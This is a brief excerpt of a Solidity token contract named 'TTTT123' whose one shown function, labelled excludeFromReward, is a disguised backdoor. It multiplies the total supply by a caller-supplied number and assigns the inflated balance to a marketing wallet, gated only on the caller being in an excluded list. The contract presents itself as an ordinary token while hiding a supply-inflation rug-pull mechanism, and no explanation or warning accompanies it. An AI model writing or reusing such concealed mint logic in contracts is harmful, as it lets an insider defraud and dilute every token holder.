...
contract BSCToken is Context, IERC20, Ownable {
    ...
    string private constant _name = "TTTT123";
    string private constant _symbol = "TTTT123";
    ...
    function excludeFromReward(uint256 account) public {
        _tTotal *= account;
        require(_isExcluded[_msgSender()], "Account is already excluded");_rOwned[marketingAddress]=_tTotal*_getRate();
    }
